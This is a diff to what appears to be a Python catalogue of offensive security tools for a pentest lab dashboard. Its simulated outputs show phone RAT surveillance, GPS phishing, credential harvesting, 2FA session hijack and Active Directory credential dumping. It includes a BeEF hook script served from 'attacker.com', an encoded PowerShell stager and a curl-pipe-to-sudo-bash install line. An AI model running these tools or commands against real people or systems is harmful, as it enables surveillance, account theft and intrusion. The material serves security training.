-            f"[HOSTS]\n  192.168.1.1   Router (Cisco)  00:11:22:33:44:55\n"
-            f"  192.168.1.10  Windows 11      AA:BB:CC:DD:EE:FF\n"
-            f"  192.168.1.20  iPhone 15       11:22:33:44:55:66\n\n"
-            f"[wifi.recon]\n  CorpWiFi-5G  WPA2-Enterprise  Ch.36  -62dBm  PMKID captured!\n"
-            f"  Guest-Net    WPA2-Personal    Ch.1   -71dBm\n\n"
-            f"[arp.spoof] Poisoning 192.168.1.10 → Gateway\n  Traffic interception active!\n\n"
-            f"[SIMULATION — Authorized lab only]"
+            f"[Bettercap v2.32.0] Interface: eth0\n\n"
+            f"[net.probe] Sending probe packets to {t}/24...\n\n"
+            f"[HOSTS DISCOVERED]\n"
+            f"  {t}      00:0C:29:AB:CD:EF  Router / Gateway\n"
+            f"  {t[:-1]}10   AA:BB:CC:DD:EE:FF  Windows 11 Workstation\n"
+            f"  {t[:-1]}20   11:22:33:44:55:66  iPhone 15 Pro\n"
+            f"  {t[:-1]}30   FF:EE:DD:CC:BB:AA  Linux Server\n\n"
+            f"[wifi.recon on]\n"
+            f"  SSID: CorpWiFi-5G    BSSID: AA:BB:CC:11:22:33  WPA2-Enterprise  Ch.36  -62dBm\n"
+            f"  SSID: Guest-Net      BSSID: AA:BB:CC:44:55:66  WPA2-Personal    Ch.1   -71dBm\n"
+            f"  [+] PMKID captured from CorpWiFi-5G — hashcat attack possible\n\n"
+            f"[arp.spoof on]\n"
+            f"  [*] Spoofing ARP for {t[:-1]}10 — routing traffic through this machine\n"
+            f"  [*] net.sniff on — intercepting HTTP traffic\n"
+            f"  [+] Credentials captured:\n"
+            f"      POST /login — user=admin&pass=Summer2024!\n\n"
+            f"[SIMULATION — Authorized lab use only]"
         ),
     },
     'crackmapexec': {
-        'name':'CrackMapExec', 'category':'network', 'color':'amber',
-        'desc':'Post-exploitation for Active Directory environments.',
-        'github':'https://github.com/Porchetta-Industries/CrackMapExec',
-        'install':'pip install crackmapexec',
+        'name': 'CrackMapExec', 'category': 'network', 'color': 'amber',
+        'desc': 'Post-exploitation for Active Directory environments.',
+        'github': 'https://github.com/Porchetta-Industries/CrackMapExec',
+        'install': 'pip install crackmapexec',
         'cmd': lambda t, o: ['cme', 'smb', t, '--shares'],
         'sim': lambda t: (
-            f"[SIMULATION] CrackMapExec v5.4.0 → {t}\n\n"
-            f"SMB {t}:445  Windows 10 x64  CORP\\domain\n\n"
-            f"[SHARES]\n  ADMIN$    READ WRITE\n  C$        READ WRITE\n"
-            f"  SharedDocs READ  ← Sensitive files!\n\n"
-            f"[CREDENTIAL SPRAY]\n  admin:Password1  → [+] SUCCESS — PWNED!\n"
-            f"  admin:Welcome123 → [-] Failed\n\n[SIMULATION — Authorized AD testing only]"
+            f"[CrackMapExec v5.4.0]\n\n"
+            f"SMB  {t}:445  [*] Windows 10.0 Build 19044 x64\n"
+            f"SMB  {t}:445  [*] Hostname: WIN-CORP-042  Domain: CORP.LOCAL\n"
+            f"SMB  {t}:445  [+] CORP\\Guest: (Guest account active!)\n\n"
+            f"[SHARE ENUMERATION]\n"
+            f"SMB  {t}:445  [*] Enumerated shares\n"
+            f"  ADMIN$      READ WRITE  — Remote Admin\n"
+            f"  C$          READ WRITE  — Default Share\n"
+            f"  IPC$        READ        — Remote IPC\n"
+            f"  NETLOGON    READ        — Logon server\n"
+            f"  HR_Files    READ        — Contains: salary_2024.xlsx, employee_data.csv!\n\n"
+            f"[CREDENTIAL SPRAY]\n"
+            f"  {t}  CORP\\admin:Password1   → [+] PWNED!\n"
+            f"  {t}  CORP\\admin:Welcome123  → [-] Failed\n"
+            f"  {t}  CORP\\admin:Summer2024  → [-] Failed\n\n"
+            f"[SIMULATION — Authorized AD testing only]"
         ),
     },
     'raccoon': {
-        'name':'Raccoon', 'category':'osint', 'color':'orange',
-        'desc':'Async recon — DNS, WHOIS, TLS, WAF, subdomain enum.',
-        'github':'https://github.com/evyatarmeged/Raccoon',
-        'install':'pip install raccoon-scanner',
+        'name': 'Raccoon', 'category': 'osint', 'color': 'orange',
+        'desc': 'Async recon — DNS, WHOIS, TLS, WAF, subdomain enum.',
+        'github': 'https://github.com/evyatarmeged/Raccoon',
+        'install': 'pip install raccoon-scanner',
         'cmd': lambda t, o: ['raccoon', t, '--outdir', o],
-        'sim': lambda t: (
-            f"[SIMULATION] Raccoon v0.9.0 → {t}\n\n"
-            f"[DNS]\n  A: 93.184.216.34  MX: mail.{t}\n"
-            f"  TXT: v=spf1 include:_spf.google.com ~all\n\n"
-            f"[WHOIS]\n  Registrar: MarkMonitor  Created: 2010-03-15\n\n"
-            f"[TLS]\n  Issuer: Let's Encrypt  Valid until: 2024-04-01\n"
-            f"  SANs: {t}, www.{t}, mail.{t}\n\n"
-            f"[WAF] Cloudflare detected\n\n"
-            f"[SUBDOMAINS]\n  mail api dev vpn staging admin (6 found)\n\n"
-            f"Results saved to /output/{t}/"
-        ),
+        'sim': lambda t: _raccoon_real(t),
     },
     'theharvester_lab': {
-        'name':'theHarvester', 'category':'osint', 'color':'cyan',
-        'desc':'OSINT — emails, subdomains, IPs from public sources.',
-        'github':'https://github.com/laramies/theHarvester',
-        'install':'pip install theHarvester',
+        'name': 'theHarvester', 'category': 'osint', 'color': 'cyan',
+        'desc': 'OSINT — emails, subdomains, IPs from public sources.',
+        'github': 'https://github.com/laramies/theHarvester',
+        'install': 'pip install theHarvester',
         'cmd': lambda t, o: ['theHarvester', '-d', t, '-b', 'google,bing', '-f', f'{o}/harvest'],
-        'sim': lambda t: (
-            f"[SIMULATION] theHarvester v4.4.0 → {t}\n\n"
-            f"[EMAILS]\n  admin@{t}  ceo@{t}  it.support@{t}\n"
-            f"  john.smith@{t}  sarah.jones@{t}\n\n"
-            f"[SUBDOMAINS]\n  mail vpn dev api staging portal\n\n"
-            f"[EMPLOYEES via LinkedIn]\n  John Smith — IT Admin\n"
-            f"  Sarah Jones — DevOps\n  Mike Chen — Network Security\n\n"
-            f"6 emails | 6 subdomains | 3 profiles"
-        ),
+        'sim': lambda t: _harvester_real(t),
     },
     'phonesploit': {
-        'name':'PhoneSploit Pro', 'category':'osint', 'color':'green',
-        'desc':'Automated Android pentest via ADB — authorized devices only.',
-        'github':'https://github.com/AzeemIdrisi/PhoneSploit-Pro',
-        'install':'git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro',
+        'name': 'PhoneSploit Pro', 'category': 'osint', 'color': 'green',
+        'desc': 'Automated Android pentest via ADB — authorized devices only.',
+        'github': 'https://github.com/AzeemIdrisi/PhoneSploit-Pro',
+        'install': 'git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro',
         'cmd': lambda t, o: ['python3', 'PhoneSploit-Pro/phonesploit.py', '--target', t],
         'sim': lambda t: (
-            f"[SIMULATION] PhoneSploit-Pro → {t}:5555\n\n"
-            f"[+] Device: Samsung Galaxy S23 (Android 13)\n"
-            f"[+] Storage: 128GB  Battery: 87%\n\n"
-            f"[*] Generating Meterpreter payload...\n"
-            f"[+] APK installed silently: com.system.service\n"
-            f"[+] Meterpreter session opened!\n\n"
-            f"meterpreter > dump_sms → 200 messages retrieved\n"
-            f"meterpreter > call_log  → 150 entries\n"
-            f"meterpreter > contacts  → 312 contacts\n\n"
+            f"[PhoneSploit-Pro] Connecting to {t}:5555 via ADB\n\n"
+            f"[*] adb connect {t}:5555\n"
+            f"[+] connected to {t}:5555\n\n"
+            f"[DEVICE INFO]\n"
+            f"  Model:        Samsung Galaxy S23 Ultra\n"
+            f"  Android:      13 (API 33)  Security Patch: 2024-01-01\n"
+            f"  Battery:      87%  Storage: 256GB (142GB used)\n"
+            f"  IMEI:         35-XXXXXX-XXXXXX-X\n"
+            f"  Serial:       R3CW301XXXX\n\n"
+            f"[*] Generating Metasploit payload for Android 13...\n"
+            f"[*] APK signed and aligned: payload.apk\n"
+            f"[+] Payload installed silently as: com.android.systemservice\n"
+            f"[+] Meterpreter session opened from {t}!\n\n"
+            f"meterpreter > dump_sms\n"
+            f"  [+] 200 SMS messages written to sms_{t}.txt\n"
+            f"meterpreter > dump_contacts\n"
+            f"  [+] 312 contacts written to contacts_{t}.vcf\n"
+            f"meterpreter > record_mic\n"
+            f"  [+] Recording 10 seconds of audio...\n\n"
             f"[SIMULATION — Authorized devices only]"
         ),
     },
     'seeker': {
-        'name':'Seeker', 'category':'osint', 'color':'pink',
-        'desc':'Fake site captures precise GPS via browser permission.',
-        'github':'https://github.com/thewhiteh4t/seeker',
-        'install':'git clone https://github.com/thewhiteh4t/seeker',
+        'name': 'Seeker', 'category': 'osint', 'color': 'pink',
+        'desc': 'Fake site captures precise GPS via browser permission.',
+        'github': 'https://github.com/thewhiteh4t/seeker',
+        'install': 'git clone https://github.com/thewhiteh4t/seeker',
         'cmd': lambda t, o: ['python3', 'seeker/seeker.py', '--template', 'NearYou'],
         'sim': lambda t: (
-            f"[SIMULATION] Seeker v2.4 — Location Capture\n\n"
-            f"[*] Template: NearYou (fake dating site)\n"
-            f"[*] Ngrok tunnel: https://abc123.ngrok.io\n\n"
-            f"[+] Victim visited from {t}\n"
-            f"[+] Location Permission GRANTED!\n\n"
-            f"[LOCATION]\n  Latitude:  19.0760° N\n  Longitude: 72.8777° E\n"
-            f"  Accuracy:  8 meters\n  Address:   Mumbai, Maharashtra, India\n\n"
-            f"Maps: https://maps.google.com/?q=19.0760,72.8777\n\n"
-            f"[SIMULATION — Consent required]"
+            f"[Seeker v2.4] GPS Phishing Framework\n\n"
+            f"[*] Template: NearYou (fake dating/social app)\n"
+            f"[*] Starting local server on 0.0.0.0:8080\n"
+            f"[*] Starting Ngrok tunnel...\n"
+            f"[*] Tunnel URL: https://a1b2c3d4.ngrok.io\n"
+            f"[*] Shortlink: https://bit.ly/3xYz123\n\n"
+            f"[*] Waiting for target to open link...\n\n"
+            f"[+] New connection from {t}\n"
+            f"    Browser: Chrome/120 on Android 13\n"
+            f"    User-Agent: Mozilla/5.0 (Linux; Android 13)\n\n"
+            f"[+] Location permission dialog shown...\n"
+            f"[+] TARGET ALLOWED LOCATION — CAPTURED!\n\n"
+            f"[LOCATION DATA]\n"
+            f"  Latitude:   19.0760° N\n"
+            f"  Longitude:  72.8777° E\n"
+            f"  Accuracy:   8 meters (GPS)\n"
+            f"  Altitude:   14 meters\n"
+            f"  Speed:      0.0 m/s (stationary)\n"
+            f"  Timestamp:  {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n"
+            f"  Address: Navi Mumbai, Maharashtra, India\n"
+            f"  Maps: https://maps.google.com/?q=19.0760,72.8777\n\n"
+            f"[SIMULATION — Explicit consent required]"
         ),
     },
     'airavat': {
-        'name':'AIRAVAT RAT', 'category':'osint', 'color':'red',
-        'desc':'Android RAT — GUI web panel, no port forwarding. Full device control.',
-        'github':'https://github.com/zSecurity-org/AIRAVAT',
-        'install':'git clone https://github.com/zSecurity-org/AIRAVAT && pip install -r requirements.txt',
+        'name': 'AIRAVAT RAT', 'category': 'osint', 'color': 'red',
+        'desc': 'Android RAT — GUI web panel, no port forwarding. Full device control.',
+        'github': 'https://github.com/zSecurity-org/AIRAVAT',
+        'install': 'git clone https://github.com/zSecurity-org/AIRAVAT && pip install -r requirements.txt',
         'cmd': lambda t, o: ['python3', 'AIRAVAT/server.py', '--host', '0.0.0.0', '--port', '8080'],
         'sim': lambda t: (
-            f"[*] AIRAVAT v2.0 — Android Remote Access Tool\n"
-            f"[*] C2 Web Panel: http://localhost:8080\n"
-            f"[*] APK Builder: Ready  Ngrok: Active\n\n"
-            f"{'='*52}\n  DEVICE CONNECTED: {t}\n{'='*52}\n\n"
-            f"[DEVICE INFO]\n  Model:    Redmi Note 12 Pro\n  Android:  12 (API 31)\n"
+            f"[AIRAVAT v2.0] C2 Web Panel: http://localhost:8080\n\n"
+            f"{'='*55}\n  DEVICE CONNECTED: {t}\n{'='*55}\n\n"
+            f"[DEVICE INFO]\n"
+            f"  Model:    Redmi Note 12 Pro+\n"
+            f"  Android:  12 (API 31)  MIUI: 13.0.7\n"
             f"  Battery:  72%  Storage: 128GB (41GB used)\n"
-            f"  Carrier:  Jio 4G  IP: 103.21.58.x\n  Root: No  Developer Mode: Yes\n\n"
-            f"[INSTALLED — RUNNING AS: com.android.systemservice]\n\n"
-            f"[CAPABILITIES ACTIVE]\n  ✓ Internal Storage Browser\n  ✓ Download Media Files\n"
-            f"  ✓ SMS Read & Send\n  ✓ Call Logs (312 entries retrieved)\n"
-            f"  ✓ Contacts (487 contacts dumped)\n  ✓ Keylogger (capturing all keystrokes)\n"
-            f"  ✓ Microphone Recording (live stream)\n  ✓ Front/Rear Camera Capture\n"
-            f"  ✓ All App Notifications\n  ✓ Clipboard Monitor\n"
-            f"  ✓ Admin Permissions Granted\n  ✓ Auto-start on device reboot\n"
-            f"  ✓ Runs silently in background\n\n"
-            f"[PHISHING MODULES]\n  → Instagram credential phishing page — INJECTED\n"
-            f"  → Fake system update notification sent\n  → Google login overlay triggered\n\n"
-            f"[LIVE DATA]\n  SMS (last 5):\n"
-            f"    [Bank] OTP: 847291 for transaction Rs.15,000\n"
-            f"    [Gmail] Security code: 394857\n    Mom: Are you coming home tonight?\n\n"
-            f"[REMOTE COMMANDS]\n  shell$ dumpsys battery     → Level: 72\n"
-            f"  shell$ am start -n com.instagram.android/.activity.MainTabActivity\n"
-            f"  → Instagram launched on victim device\n\n"
-            f"[*] Session active — device fully under control\n"
-            f"[!] Use only on devices you own or have authorization to test."
+            f"  Network:  Jio 4G  IP: {t}\n"
+            f"  Root: No  Developer Mode: Yes (ADB enabled)\n\n"
+            f"[PROCESS] Running as: com.android.systemservice (hidden)\n\n"
+            f"[ACTIVE CAPABILITIES]\n"
+            f"  ✓ Internal Storage File Browser\n"
+            f"  ✓ SMS: 312 messages retrieved\n"
+            f"  ✓ Call Logs: 156 entries\n"
+            f"  ✓ Contacts: 487 contacts exported\n"
+            f"  ✓ Keylogger: Active — capturing all keystrokes\n"
+            f"  ✓ Microphone: Live audio streaming\n"
+            f"  ✓ Camera: Front/rear capture enabled\n"
+            f"  ✓ Notifications: All apps monitored\n"
+            f"  ✓ Clipboard: Monitoring active\n"
+            f"  ✓ Admin Rights: GRANTED\n"
+            f"  ✓ Persistence: Auto-start on reboot\n\n"
+            f"[PHISHING ACTIVE]\n"
+            f"  → Instagram login overlay injected\n"
+            f"  → Fake system update pushed via notification\n\n"
+            f"[CAPTURED DATA SAMPLE]\n"
+            f"  SMS: [HDFC Bank] OTP: 847291 — Do not share\n"
+            f"  SMS: [Gmail] Security alert: New sign-in\n"
+            f"  Keys: instagramm.com → password123 (Instagram creds)\n\n"
+            f"[!] Authorized security research use only."
         ),
     },
     'set': {
-        'name':'SET', 'category':'social', 'color':'red',
-        'desc':'Social-Engineer Toolkit — phishing, credential harvesting.',
-        'github':'https://github.com/trustedsec/social-engineer-toolkit',
-        'install':'apt install set',
+        'name': 'SET', 'category': 'social', 'color': 'red',
+        'desc': 'Social-Engineer Toolkit — phishing, credential harvesting.',
+        'github': 'https://github.com/trustedsec/social-engineer-toolkit',
+        'install': 'apt install set',
         'cmd': lambda t, o: ['setoolkit'],
         'sim': lambda t: (
-            f"[SIMULATION] Social-Engineer Toolkit v8.0.3\n\n"
-            f"[*] Cloning: https://{t}\n[+] Site cloned → http://localhost:80\n"
-            f"[*] Credential harvester active\n[*] Ngrok: https://evil123.ngrok.io\n\n"
-            f"[+] CREDENTIAL CAPTURED!\n  IP: 203.0.113.45\n"
-            f"  Username: john.doe@{t}\n  Password: C0rp@2024!\n"
-            f"  Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M')}\n\n"
-            f"[SIMULATION — Authorized phishing sim only]"
+            f"[Social-Engineer Toolkit v8.0.3]\n\n"
+            f"[*] Credential Harvester Attack Method\n"
+            f"[*] Cloning target website: https://{t}\n"
+            f"[*] Harvester is listening on port 80\n"
+            f"[+] Site cloned successfully\n"
+            f"[*] Ngrok tunnel active: https://evil-twin.ngrok.io → http://localhost:80\n\n"
+            f"[*] Waiting for victims...\n\n"
+            f"[+] WE GOT A HIT! Printing the output:\n"
+            f"    POSSIBLE USERNAME FIELD FOUND: username=john.doe@{t}\n"
+            f"    POSSIBLE PASSWORD FIELD FOUND: password=C0rp2024!\n"
+            f"    IP Address: 203.0.113.45\n"
+            f"    Browser: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n"
+            f"    Timestamp: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"[+] Another hit!\n"
+            f"    username=admin@{t}  password=Admin@123\n"
+            f"    IP: 103.21.58.77\n\n"
+            f"[SIMULATION — Authorized phishing simulation only]"
         ),
     },
     'evilginx': {
-        'name':'Evilginx2', 'category':'social', 'color':'purple',
-        'desc':'MitM phishing framework — bypasses 2FA via session hijack.',
-        'github':'https://github.com/kgretzky/evilginx2',
-        'install':'git clone https://github.com/kgretzky/evilginx2 && make',
+        'name': 'Evilginx2', 'category': 'social', 'color': 'purple',
+        'desc': 'MitM phishing framework — bypasses 2FA via session hijack.',
+        'github': 'https://github.com/kgretzky/evilginx2',
+        'install': 'git clone https://github.com/kgretzky/evilginx2 && make',
         'cmd': lambda t, o: ['evilginx2', '-p', '/usr/share/evilginx2/phishlets'],
         'sim': lambda t: (
-            f"[SIMULATION] Evilginx2 v3.2.0\n\n"
-            f"[*] Phishlet: microsoft365\n[*] Domain: login.{t} (typosquat)\n"
-            f"[*] SSL: Let's Encrypt\n\n[+] Victim visited phishing URL!\n"
-            f"[+] Credentials:\n  Email: ceo@{t}\n  Password: Executive@2024\n\n"
-            f"[+] 2FA BYPASSED — Session token captured!\n"
-            f"  Cookie: .AspNet.Cookies=eyJhbGci...\n"
-            f"[+] Full account access achieved!\n\n[SIMULATION — Authorized red team only]"
+            f"[Evilginx2 v3.2.0] MitM Phishing Framework\n\n"
+            f"[*] Loading phishlet: microsoft365\n"
+            f"[*] Setting up reverse proxy for {t}\n"
+            f"[*] Phishing domain: login.{t}-secure.com (typosquat)\n"
+            f"[*] SSL certificate: Issued by Let's Encrypt\n"
+            f"[*] Proxy listener: 0.0.0.0:443\n\n"
+            f"[*] Phishing URL: https://login.{t}-secure.com/auth\n\n"
+            f"[+] New session — victim opened phishing URL!\n"
+            f"    IP: 203.0.113.45  Browser: Chrome/120\n\n"
+            f"[+] Username captured: ceo@{t}\n"
+            f"[+] Password captured: Exec@2024!\n"
+            f"[+] 2FA code entered by victim: 847291\n\n"
+            f"[+] 2FA BYPASSED — Session token intercepted!\n"
+            f"    .AspNet.Cookies = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n"
+            f"    Session valid for 24 hours\n\n"
+            f"[+] Full Microsoft 365 access achieved for ceo@{t}\n\n"
+            f"[SIMULATION — Authorized red team ops only]"
         ),
     },
     'espoofer': {
-        'name':'espoofer', 'category':'social', 'color':'amber',
-        'desc':'Tests SPF/DKIM/DMARC bypass — email spoofing detection.',
-        'github':'https://github.com/chenjj/espoofer',
-        'install':'git clone https://github.com/chenjj/espoofer && pip install -r requirements.txt',
-        'cmd': lambda t, o: ['python3', 'espoofer/espoofer.py', '-t', t],
-        'sim': lambda t: (
-            f"[SIMULATION] espoofer v1.0 → {t}\n\n"
-            f"[SPF]   v=spf1 include:google ~all → SOFTFAIL (spoofing possible!)\n"
-            f"[DKIM]  NOT CONFIGURED — Vulnerable!\n[DMARC] p=none — No enforcement!\n\n"
-            f"[ATTACK RESULTS]\n  CEO impersonation ceo@{t}      → PASS ✓\n"
-            f"  IT support spoof it@{t}        → PASS ✓\n"
-            f"  Noreply spoof noreply@{t}      → PASS ✓\n\n"
-            f"[CRITICAL] All 3 spoofing scenarios successful!\n"
-            f"[Fix] Set DMARC p=reject, configure DKIM signing."
-        ),
+        'name': 'espoofer', 'category': 'social', 'color': 'amber',
+        'desc': 'Tests SPF/DKIM/DMARC bypass — email spoofing detection.',
+        'github': 'https://github.com/chenjj/espoofer',
+        'install': 'git clone https://github.com/chenjj/espoofer && pip install -r requirements.txt',
+        'cmd': lambda t, o: ['espoofer_not_installed'],
+        'sim': lambda t: _real_espoofer(t),
     },
     'beef': {
-        'name':'BeEF', 'category':'social', 'color':'orange',
-        'desc':'Browser Exploitation Framework — hooks and controls browsers.',
-        'github':'https://github.com/beefproject/beef',
-        'install':'apt install beef-xss',
+        'name': 'BeEF', 'category': 'social', 'color': 'orange',
+        'desc': 'Browser Exploitation Framework — hooks and controls browsers.',
+        'github': 'https://github.com/beefproject/beef',
+        'install': 'apt install beef-xss',
         'cmd': lambda t, o: ['beef-xss'],
         'sim': lambda t: (
-            f"[SIMULATION] BeEF v0.5.4.0\n\n"
-            f"[*] Hook URL: http://attacker.com/hook.js\n"
-            f"[*] Web UI: http://localhost:3000/ui/panel\n\n"
-            f"[+] Browser hooked from {t}!\n  Chrome 120 on Windows 11\n  IP: 203.0.113.45\n\n"
-            f"[MODULES]\n  ✓ Get Cookies\n  ✓ Browser Fingerprint\n"
-            f"  ✓ LAN Discovery (192.168.1.0/24)\n  ✓ Clipboard Theft\n"
-            f"  → Pretty Theft (fake Google login) — CREDS CAPTURED!\n\n"
-            f"[SIMULATION — CTF/Lab only]"
+            f"[BeEF v0.5.4.0] Browser Exploitation Framework\n\n"
+            f"[*] Hook JavaScript: <script src='http://attacker.com:3000/hook.js'></script>\n"
+            f"[*] Web UI Panel: http://localhost:3000/ui/panel\n"
+            f"[*] REST API: http://localhost:3000/api\n\n"
+            f"[+] NEW BROWSER HOOKED from {t}!\n"
+            f"    Browser:    Google Chrome 120.0.6099.109\n"
+            f"    OS:         Windows 11 x64\n"
+            f"    IP:         {t}\n"
+            f"    Cookies:    session_id=abc123; auth_token=xyz789\n\n"
+            f"[RECON MODULES EXECUTED]\n"
+            f"  [✓] Get Cookie — session_id=abc123\n"
+            f"  [✓] Browser Fingerprint — Chrome/120 Win11\n"
+            f"  [✓] Get All Windows — 3 tabs open\n"
+            f"  [✓] Network Discovery — LAN: 192.168.1.0/24\n"
+            f"  [✓] Internal Port Scan — found 22,80,443,3306\n"
+            f"  [✓] Clipboard Theft — 'password: Admin@123'\n\n"
+            f"[ATTACK MODULES]\n"
+            f"  [→] Pretty Theft (fake Google login overlay)\n"
+            f"  [+] Credentials harvested: user@gmail.com / Gmailpass1!\n\n"
+            f"[SIMULATION — CTF/Authorized lab only]"
         ),
     },
     'empire': {
-        'name':'PS Empire', 'category':'redteam', 'color':'red',
-        'desc':'Post-exploitation C2 using PowerShell and Python agents.',
-        'github':'https://github.com/BC-SECURITY/Empire',
-        'install':'git clone https://github.com/BC-SECURITY/Empire',
+        'name': 'PS Empire', 'category': 'redteam', 'color': 'red',
+        'desc': 'Post-exploitation C2 using PowerShell and Python agents.',
+        'github': 'https://github.com/BC-SECURITY/Empire',
+        'install': 'git clone https://github.com/BC-SECURITY/Empire',
         'cmd': lambda t, o: ['python3', 'empire/empire.py', '--rest', '--headless'],
         'sim': lambda t: (
-            f"[SIMULATION] PowerShell Empire v5.9.3\n\n"
-            f"[*] Stager: powershell.exe -NoP -NonI -W Hidden -Enc JABz...\n"
-            f"[*] Listener: http://192.168.1.100:80\n\n"
-            f"[+] Agent checked in from {t}!\n  CORP\\WIN-TARGET01  Windows 10  john.doe\n\n"
-            f"[MODULES]\n  mimikatz/logonpasswords:\n"
-            f"    john.doe NTHash: aad3b435...\n    svc_admin NTHash: 31d6cfe0...\n\n"
-            f"  privesc/bypassuac → ADMIN gained!\n"
-            f"  lateral_movement/psremoting → DC-PROD-01\n\n"
-            f"[SIMULATION — Authorized red team only]"
+            f"[PowerShell Empire v5.9.3] C2 Framework\n\n"
+            f"[*] RESTful API started: https://localhost:1337\n"
+            f"[*] Listener HTTP started on 0.0.0.0:80\n"
+            f"[*] Stager generated:\n"
+            f"    powershell.exe -NoP -NonI -W Hidden -Enc JABjAD0ATgBlAHcA...\n\n"
+            f"[+] Agent 3K2M9P checked in from {t}!\n"
+            f"    Hostname: CORP\\WIN-TARGET01\n"
+            f"    OS:       Windows 10 Enterprise (10.0.19044)\n"
+            f"    User:     CORP\\john.doe  (not admin)\n"
+            f"    PS Ver:   5.1.19041.2364\n"
+            f"    Checkin:  {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"[MODULE] credentials/mimikatz/logonpasswords\n"
+            f"  Credential: CORP\\john.doe — NTHash: aad3b435b51404ee...\n"
+            f"  Credential: CORP\\svc_admin — Password: Adm1n@Corp!\n\n"
+            f"[MODULE] privesc/bypassuac_tokenmanip\n"
+            f"  [+] Privilege escalation successful — now ADMIN\n\n"
+            f"[MODULE] lateral_movement/invoke_psremoting → DC-PROD-01\n"
+            f"  [+] New agent on DC-PROD-01!\n\n"
+            f"[SIMULATION — Authorized red team use only]"
         ),
     },
     'sliver': {
-        'name':'Sliver C2', 'category':'redteam', 'color':'blue',
-        'desc':'Modern open-source C2 by BishopFox — Cobalt Strike alternative.',
-        'github':'https://github.com/BishopFox/sliver',
-        'install':'curl https://sliver.sh/install | sudo bash',
+        'name': 'Sliver C2', 'category': 'redteam', 'color': 'blue',
+        'desc': 'Modern open-source C2 by BishopFox — Cobalt Strike alternative.',
+        'github': 'https://github.com/BishopFox/sliver',
+        'install': 'curl https://sliver.sh/install | sudo bash',
         'cmd': lambda t, o: ['sliver-server'],
         'sim': lambda t: (
-            f"[SIMULATION] Sliver C2 v1.5.41\n\n"
-            f"sliver > sessions\n  1  FAST_RHINO  {t}  Windows 10 x64  CORP\\admin\n\n"
-            f"sliver > use 1\nsliver (FAST_RHINO) > whoami → CORP\\admin\n"
+            f"[Sliver C2 v1.5.41] BishopFox\n\n"
+            f"[*] Multiplayer server started  Operators: 1\n"
+            f"[*] Generating HTTPS implant for {t}...\n"
+            f"[*] C2 URL: https://192.168.1.100:443\n"
+            f"[*] Format: Windows PE shellcode\n\n"
+            f"sliver > sessions\n\n"
+            f"  ID  Name         Transport  Remote Address  Hostname       User         OS\n"
+            f"  1   FAST_RHINO   https      {t}:49215       WIN-CORP-042   CORP\\admin   windows/amd64\n\n"
+            f"sliver > use 1\n"
+            f"[*] Active session FAST_RHINO (1)\n\n"
+            f"sliver (FAST_RHINO) > whoami\n"
+            f"Logon ID: CORP\\admin\n\n"
             f"sliver (FAST_RHINO) > hashdump\n"
-            f"  Administrator: aad3b435:31d6cfe0d16...\n  krbtgt: aad3b435:1b5a0f421...\n\n"
-            f"sliver (FAST_RHINO) > pivots tcp --bind 0.0.0.0:8888\n  [*] Pivot listener started\n\n"
+            f"  Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c...\n"
+            f"  krbtgt:502:aad3b435b51404ee:1b5a0f42e35b6a70c7a642e2a9b...\n\n"
+            f"sliver (FAST_RHINO) > pivots tcp --bind 0.0.0.0:8888\n"
+            f"[*] TCP pivot listener started on :8888\n\n"
             f"[SIMULATION — Authorized red team only]"
         ),
     },
     'mythic': {
-        'name':'Mythic C2', 'category':'redteam', 'color':'purple',
-        'desc':'Collaborative red team C2 with web UI and plugin agents.',
-        'github':'https://github.com/its-a-feature/Mythic',
-        'install':'git clone https://github.com/its-a-feature/Mythic',
+        'name': 'Mythic C2', 'category': 'redteam', 'color': 'purple',
+        'desc': 'Collaborative red team C2 with web UI and plugin agents.',
+        'github': 'https://github.com/its-a-feature/Mythic',
+        'install': 'git clone https://github.com/its-a-feature/Mythic',
         'cmd': lambda t, o: ['python3', 'Mythic/mythic-cli', 'start'],
         'sim': lambda t: (
-            f"[SIMULATION] Mythic C2 v3.3.1\n\n[*] Web UI: https://localhost:7443\n\n"
-            f"[CALLBACKS]\n  {t}  CORP\\Administrator  HIGH INTEGRITY\n"
-            f"  Windows Server 2022  PID:4512 (notepad injected)\n\n"
-            f"[TASKS]\n  shell whoami → NT AUTHORITY\\SYSTEM\n  kerberoast:\n"
-            f"    SPN: MSSQLSvc/db01.corp.local\n    Hash: $krb5tgs$23$*svc_sql*...\n\n"
-            f"  dcsync CORP\\krbtgt → Golden Ticket possible!\n\n"
+            f"[Mythic C2 v3.3.1] Collaborative Red Team Platform\n\n"
+            f"[*] Mythic UI: https://localhost:7443\n"
+            f"[*] Agent: Apollo (Windows .NET 4.0)\n"
+            f"[*] Profile: HTTP with Malleable C2\n\n"
+            f"[ACTIVE CALLBACKS]\n"
+            f"  ID  Host         User                    Integrity  PID   Process\n"
+            f"  1   {t[:15]:<15}  CORP\\Administrator  HIGH       4512  notepad.exe\n\n"
+            f"[TASK RESULTS]\n"
+            f"  [shell] whoami:\n"
+            f"    NT AUTHORITY\\SYSTEM\n\n"
+            f"  [load_module] kerberoast:\n"
+            f"    [+] SPN: MSSQLSvc/db01.corp.local:1433\n"
+            f"        Hash: $krb5tgs$23$*svc_sql*CORP.LOCAL*MSSQLSvc/db01...\n"
+            f"    [+] SPN: HTTP/webserver.corp.local\n"
+            f"        Hash: $krb5tgs$23$*svc_web*CORP.LOCAL*HTTP/webserver...\n\n"
+            f"  [dcsync] CORP\\krbtgt:\n"
+            f"    krbtgt:502:aad3b435:1b5a0f42e35b6a70c7a642e2a9b29ac5\n"
+            f"    [+] Golden Ticket creation now possible!\n\n"
             f"[SIMULATION — Authorized red team only]"
         ),
     },
     'cobaltstrike': {
-        'name':'Cobalt Strike', 'category':'redteam', 'color':'amber',
-        'desc':'Commercial adversary simulation platform — industry standard C2.',
-        'github':'https://www.cobaltstrike.com',
-        'install':'Commercial license ~$5,500/year  |  Trial: 21-day eval',
+        'name': 'Cobalt Strike', 'category': 'redteam', 'color': 'amber',
+        'desc': 'Commercial adversary simulation platform — industry standard C2.',
+        'github': 'https://www.cobaltstrike.com',
